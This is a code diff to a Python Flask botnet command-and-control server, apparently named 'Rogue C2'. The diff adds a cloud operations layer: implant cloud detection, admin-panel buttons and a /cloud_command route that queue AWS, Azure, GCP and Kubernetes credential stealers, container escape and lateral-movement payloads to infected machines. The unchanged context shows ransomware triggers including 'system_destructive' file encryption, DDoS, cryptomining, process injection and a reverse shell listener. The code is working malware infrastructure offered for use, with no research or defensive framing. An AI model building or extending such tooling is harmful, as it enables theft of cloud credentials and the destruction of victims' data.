@@ -92,7 +92,8 @@ def c2_controller():
                     'beacon_count': 0,
                     'commands_sent': 0,
                     'results_received': 0,
-                    'implant_id': 'unknown'  # Will be updated when identified
+                    'implant_id': 'unknown',  # Will be updated when identified
+                    'cloud_info': {}  # Add cloud info field
                 }
             
             # Update stats
@@ -136,7 +137,8 @@ def c2_controller():
                         'beacon_count': 1,
                         'commands_sent': 0,
                         'results_received': 0,
-                        'implant_id': 'unknown'
+                        'implant_id': 'unknown',
+                        'cloud_info': {}
                     }
             
             result_entry = {
@@ -176,7 +178,8 @@ def c2_controller():
                     'beacon_count': 0,
                     'commands_sent': 0,
                     'results_received': 0,
-                    'implant_id': implant_id
+                    'implant_id': implant_id,
+                    'cloud_info': {}
                 }
             else:
                 bot_info[beacon_id]['implant_id'] = implant_id
@@ -186,6 +189,31 @@ def c2_controller():
             print(f"[+] Implant identified: {implant_id} -> Bot ID: {beacon_id}")
             
             return encrypt_response(f"identified:{beacon_id}")
+        
+        elif decrypted_cmd.startswith("cloud_detected:"):
+            # Implant reporting cloud environment
+            cloud_data = json.loads(decrypted_cmd.replace("cloud_detected:", "", 1))
+            
+            # Get or create bot ID
+            beacon_id = get_bot_id(client_ip, cloud_data.get('implant_id', 'unknown'))
+            
+            # Store cloud info
+            if beacon_id not in bot_info:
+                bot_info[beacon_id] = {
+                    'ip': client_ip,
+                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'beacon_count': 0,
+                    'commands_sent': 0,
+                    'results_received': 0,
+                    'implant_id': 'unknown'
+                }
+            
+            bot_info[beacon_id]['cloud_info'] = cloud_data
+            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            print(f"[CLOUD] Bot {beacon_id} detected in {cloud_data.get('provider', 'unknown')} cloud")
+            
+            return encrypt_response("cloud_info_received")
         
         else:
             # Unknown command
@@ -231,6 +259,7 @@ def admin_panel():
             .compound-btn { background: #5a5a2a; }
             .encryption-btn { background: #ff6600; }
             .advanced-btn { background: #8a2be2; }
+            .cloud-btn { background: #2b8a8a; }
             .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
             .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
             .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
@@ -242,6 +271,7 @@ def admin_panel():
             .fileransom-form label { font-size: 12px; margin-bottom: 3px; color: #888; }
             .warning-box { background: #3a1a1a; border: 2px solid #ff3333; padding: 15px; margin: 15px 0; }
             .advanced-box { background: #1a1a3a; border: 2px solid #8a2be2; padding: 15px; margin: 15px 0; }
+            .cloud-box { background: #1a2a3a; border: 2px solid #2b8a8a; padding: 15px; margin: 15px 0; }
         </style>
     </head>
     <body>
@@ -256,6 +286,7 @@ def admin_panel():
                 <div class="tab" onclick="switchTab('operations')"> Operations</div>
                 <div class="tab" onclick="switchTab('payloads')"> Payloads</div>
                 <div class="tab" onclick="switchTab('advanced')"> Advanced</div>
+                <div class="tab" onclick="switchTab('cloud')"> Cloud Ops</div>
                 <div class="tab" onclick="switchTab('results')"> Results</div>
                 <div class="tab" onclick="switchTab('server')"> Server Status</div>
             </div>
@@ -270,6 +301,15 @@ def admin_panel():
                         <span class="status">● Implant ID: {{ bot.implant_id }}</span>
                         <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
                         <span class="status">● IP: {{ bot.ip }}</span>
+                        
+                        <!-- CLOUD INFO DISPLAY -->
+                        {% if bot.get('cloud_info') and bot.cloud_info %}
+                        <span class="status" style="color: #2b8a8a;">
+                            ● Cloud: {{ bot.cloud_info.provider|upper if bot.cloud_info.provider != 'unknown' else 'Unknown' }}
+                            {% if bot.cloud_info.type %} ({{ bot.cloud_info.type }}){% endif %}
+                        </span>
+                        {% endif %}
+                        
                         <div class="bot-stats">
                              Beacons: {{ bot.beacon_count }} |  Cmds Sent: {{ bot.commands_sent }} |  Results: {{ bot.results_received }}
                         </div>
@@ -296,6 +336,17 @@ def admin_panel():
                                 <option value="trigger_filehide">Advanced File Hide</option>
                                 <option value="trigger_cronpersist">Advanced Cron Persist</option>
                                 <option value="trigger_compclean">Competitor Cleaner</option>
+                                <!-- CLOUD TRIGGERS -->
+                                <option value="trigger_cloud_detect">Detect Cloud</option>
+                                <option value="trigger_cloud_recon">Cloud Recon</option>
+                                <option value="trigger_aws_creds">AWS Creds</option>
+                                <option value="trigger_aws_enum">AWS Enum</option>
+                                <option value="trigger_azure_creds">Azure Creds</option>
+                                <option value="trigger_azure_enum">Azure Enum</option>
+                                <option value="trigger_gcp_creds">GCP Creds</option>
+                                <option value="trigger_gcp_enum">GCP Enum</option>
+                                <option value="trigger_container_escape">Container Escape</option>
+                                <option value="trigger_k8s_creds">K8s Creds</option>
                                 <!-- FILE ENCRYPTION OPTIONS -->
                                 <option value="trigger_fileransom encrypt /home/user/Documents">Encrypt Documents</option>
                                 <option value="trigger_fileransom encrypt /home/user/Downloads">Encrypt Downloads</option>
@@ -627,6 +678,37 @@ def admin_panel():
                             <button onclick="sendToAll('load_payload competitor_cleaner.py')">Load</button>
                             <button onclick="sendToAll('run_payload competitor_cleaner.py')" style="background: #8a2be2;">Run</button>
                         </div>
+                        <!-- CLOUD PAYLOADS -->
+                        <div class="bot cloud-box">
+                            <strong style="color: #2b8a8a;">Cloud Detector</strong>
+                            <p><small> Detect cloud environment (AWS/Azure/GCP)</small></p>
+                            <button onclick="sendToAll('load_payload cloud_detector.py')">Load</button>
+                            <button onclick="sendToAll('run_payload cloud_detector.py')" style="background: #2b8a8a;">Run</button>
+                        </div>
+                        <div class="bot cloud-box">
+                            <strong style="color: #2b8a8a;">AWS Credential Stealer</strong>
+                            <p><small> Steal AWS credentials and metadata</small></p>
+                            <button onclick="sendToAll('load_payload aws_credential_stealer.py')">Load</button>
+                            <button onclick="sendToAll('run_payload aws_credential_stealer.py')" style="background: #2b8a8a;">Run</button>
+                        </div>
+                        <div class="bot cloud-box">
+                            <strong style="color: #2b8a8a;">Azure Cred Harvester</strong>
+                            <p><small> Harvest Azure credentials and tokens</small></p>
+                            <button onclick="sendToAll('load_payload azure_cred_harvester.py')">Load</button>
+                            <button onclick="sendToAll('run_payload azure_cred_harvester.py')" style="background: #2b8a8a;">Run</button>
+                        </div>
+                        <div class="bot cloud-box">
+                            <strong style="color: #2b8a8a;">Container Escape</strong>
+                            <p><small> Escape from containerized environments</small></p>
+                            <button onclick="sendToAll('load_payload container_escape.py')">Load</button>
+                            <button onclick="sendToAll('run_payload container_escape.py')" style="background: #2b8a8a;">Run</button>
+                        </div>
+                        <div class="bot cloud-box">
+                            <strong style="color: #2b8a8a;">Kubernetes Secret Stealer</strong>
+                            <p><small> Steal Kubernetes secrets and configs</small></p>
+                            <button onclick="sendToAll('load_payload k8s_secret_stealer.py')">Load</button>
+                            <button onclick="sendToAll('run_payload k8s_secret_stealer.py')" style="background: #2b8a8a;">Run</button>
+                        </div>
                         <!-- END NEW PAYLOADS -->
                         <div class="bot" style="border: 2px solid #ff6600;">
                             <strong style="color: #ff6600;">File Encryption</strong>
@@ -638,7 +720,7 @@ def admin_panel():
                 </div>
             </div>
             
-            <!-- ADVANCED TAB (NEW) -->
+            <!-- ADVANCED TAB -->
             <div id="advanced-tab" class="tab-content">
                 <div class="section advanced-box">
                     <h2 style="color: #8a2be2;"> Advanced Payloads Suite</h2>
@@ -728,6 +810,80 @@ def admin_panel():
                 </div>
             </div>
             
+            <!-- CLOUD OPERATIONS TAB -->
+            <div id="cloud-tab" class="tab-content">
+                <div class="section cloud-box">
+                    <h2 style="color: #2b8a8a;">☁️ Cloud-Aware Operations</h2>
+                    <p>Specialized tools for cloud environment exploitation</p>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px;">
+                        <div class="bot">
+                            <h3 style="color: #2b8a8a;">Cloud Detection</h3>
+                            <p><small>Detect cloud environment and adapt implant behavior</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_cloud_detect')" style="background: #2b8a8a;">Detect Cloud</button>
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_cloud_recon')" style="background: #1a6a6a;">Cloud Recon</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #2b8a8a;">AWS Operations</h3>
+                            <p><small>AWS-specific credential harvesting and enumeration</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_aws_creds')" style="background: #2b8a8a;">Steal AWS Creds</button>
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_aws_enum')" style="background: #1a6a6a;">Enumerate AWS</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload aws_lateral.py')">Load Lateral</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #2b8a8a;">Azure Operations</h3>
+                            <p><small>Azure credential harvesting and resource discovery</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_azure_creds')" style="background: #2b8a8a;">Steal Azure Creds</button>
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_azure_enum')" style="background: #1a6a6a;">Enumerate Azure</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload azure_lateral.py')">Load Lateral</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #2b8a8a;">GCP Operations</h3>
+                            <p><small>Google Cloud Platform credential harvesting</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_gcp_creds')" style="background: #2b8a8a;">Steal GCP Creds</button>
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_gcp_enum')" style="background: #1a6a6a;">Enumerate GCP</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload gcp_lateral.py')">Load Lateral</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #2b8a8a;">Container Operations</h3>
+                            <p><small>Container escape and Kubernetes exploitation</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_container_escape')" style="background: #2b8a8a;">Container Escape</button>
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_k8s_creds')" style="background: #1a6a6a;">K8s Creds</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload docker_breakout.py')">Load Breakout</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="section" style="margin-top: 30px;">
+                        <h3>Cloud Environment Scanner</h3>
+                        <div class="command-form">
+                            <input type="text" id="cloud_target" placeholder="Target path or 'full' for complete scan" style="width: 400px;">
+                            <button onclick="sendCloudCommand('scan')" style="background: #2b8a8a;">Scan Cloud Environment</button>
+                            <button onclick="sendCloudCommand('adapt')" style="background: #1a6a6a;">Adapt Implant to Cloud</button>
+                        </div>
+                        
+                        <div style="margin-top: 15px;">
+                            <button onclick="document.getElementById('cloud_target').value = 'full'">Full Cloud Scan</button>
+                            <button onclick="document.getElementById('cloud_target').value = 'credentials'">Credentials Only</button>
+                            <button onclick="document.getElementById('cloud_target').value = 'metadata'">Metadata Only</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
             <!-- RESULTS TAB -->
             <div id="results-tab" class="tab-content">
                 <div class="section">
@@ -761,6 +917,7 @@ def admin_panel():
                     <p><strong>Active Bots:</strong> {{ bot_count }}</p>
                     <p><strong>Pending Commands:</strong> {{ pending_count }}</p>
                     <p><strong>Advanced Payloads:</strong> 4 (New)</p>
+                    <p><strong>Cloud Payloads:</strong> 5 (New)</p>
                     <p><strong>Uptime:</strong> <span id="uptime">Calculating...</span></p>
                     
                     <h3> Quick Actions</h3>
@@ -781,6 +938,7 @@ def admin_panel():
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_help'">Insert Help</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_procinject'" style="background: #8a2be2;">Insert Process Inject</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_cloud_detect'" style="background: #2b8a8a;">Insert Cloud Detect</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt all'" style="background: #ff5500;">Insert Encrypt All</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt system_destructive'" style="background: #ff0000; color: white;">Insert System Destructive</button>
@@ -1118,6 +1276,21 @@ def admin_panel():
                 sendToAll(command);
             }
             
+            // CLOUD COMMANDS FUNCTIONS
+            function sendCloudCommand(action) {
+                var target = document.getElementById('cloud_target').value;
+                if (!target) {
+                    target = 'full';
+                }
+                
+                var cmd = 'trigger_cloud_' + action + ' ' + target;
+                
+                var botId = selectedBotId();
+                if (!botId) return;
+                
+                sendToBot(botId, cmd);
+            }
+            
             // Auto-refresh every 30 seconds
             setTimeout(() => location.reload(), 30000);
         </script>
@@ -1149,7 +1322,8 @@ def admin_panel():
                         'last_seen_diff': seconds_ago,
                         'beacon_count': bot_info[bot_id].get('beacon_count', 0),
                         'commands_sent': bot_info[bot_id].get('commands_sent', 0),
-                        'results_received': bot_info[bot_id].get('results_received', 0)
+                        'results_received': bot_info[bot_id].get('results_received', 0),
+                        'cloud_info': bot_info[bot_id].get('cloud_info', {})
                     })
     
     # Remove old bots
@@ -1216,6 +1390,41 @@ def add_command():
         print(f"[-] Command error: {e}")
         return jsonify({'error': str(e)}), 500
 
+@app.route('/cloud_command', methods=['POST'])
+def cloud_command():
+    """Send cloud-specific command"""
+    try:
+        data = request.json
+        beacon_id = data.get('beacon_id')
+        command = data.get('command')
+        
+        if not beacon_id or not command:
+            return jsonify({'error': 'Missing beacon_id or command'}), 400
+        
+        # Map cloud commands to actual triggers
+        command_map = {
+            'cloud_detect': 'run_payload cloud_detector.py',
+            'aws_creds': 'run_payload aws_credential_stealer.py',
+            'azure_creds': 'run_payload azure_cred_harvester.py',
+            'container_escape': 'run_payload container_escape.py',
+            'cloud_recon': 'trigger_cloud_recon',
+        }
+        
+        actual_command = command_map.get(command, command)
+        pending_commands[beacon_id].append(actual_command)
+        
+        print(f"[CLOUD] Cloud command queued for {beacon_id}: {command} -> {actual_command}")
+        
+        return jsonify({
+            'status': 'queued',
+            'command': command,
+            'actual_command': actual_command
+        })
+        
+    except Exception as e:
+        print(f"[-] Cloud command error: {e}")
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/clear_pending/<bot_id>', methods=['POST'])
 def clear_pending(bot_id):
     """Clear pending commands for a bot"""
@@ -1275,12 +1484,14 @@ def list_payloads():
             .payload-info {{ font-size: 12px; color: #888; margin-top: 5px; }}
             .warning {{ border: 2px solid #ff6600; background: #3a1a1a; }}
             .advanced {{ border: 2px solid #8a2be2; background: #1a1a3a; }}
+            .cloud {{ border: 2px solid #2b8a8a; background: #1a2a3a; }}
         </style>
     </head>
     <body>
         <h1>Rogue C2 Payload Repository</h1>
         <p><strong>Total Payloads:</strong> {len([f for f in files if f.endswith('.py')])}</p>
         <p><strong>Advanced Payloads (NEW):</strong> 4</p>
+        <p><strong>Cloud Payloads (NEW):</strong> 5</p>
         <ul>
     """
     
@@ -1295,7 +1506,8 @@ def list_payloads():
         'Command & Control': ['dnstunnel.py'],
         'Impact': ['ddos.py', 'mine.py', 'fileransom.py'],
         'Persistence': ['polyloader.py'],
-        'Advanced (NEW)': ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py']
+        'Advanced (NEW)': ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'],
+        'Cloud (NEW)': ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py', 'k8s_secret_stealer.py']
     }
     
     for category, payloads in payload_categories.items():
@@ -1306,6 +1518,8 @@ def list_payloads():
                     warning_class = 'warning'
                 elif payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py']:
                     warning_class = 'advanced'
+                elif payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py', 'k8s_secret_stealer.py']:
+                    warning_class = 'cloud'
                 else:
                     warning_class = ''
                 
@@ -1317,6 +1531,7 @@ def list_payloads():
                         <a href="javascript:sendToAll(\\'load_payload {payload}\\')">Load</a> | 
                         <a href="javascript:sendToAll(\\'run_payload {payload}\\')">Run</a>
                         { ' | <span style="color:#8a2be2"> NEW</span>' if payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'] else '' }
+                        { ' | <span style="color:#2b8a8a"> CLOUD</span>' if payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py', 'k8s_secret_stealer.py'] else '' }
                     </div>
                 </li>
                 '''
@@ -1529,6 +1744,7 @@ def main():
     print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
     print(f"[PAYLOADS] Available at: {ngrok_url}/payloads/" if ngrok_url else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
     print(f"[ADVANCED] 4 New Payloads Added: Process Injection, File Hider, Cron Persist, Competitor Cleaner")
+    print(f"[CLOUD] 5 Cloud Payloads Added: Cloud Detector, AWS/Azure/GCP Stealers, Container Escape, K8s Stealer")
     print(f"[FILE ENCRYPTION] System-wide modes: system_test, system_user, system_aggressive, system_destructive")
     print("\n" + "="*60)
     
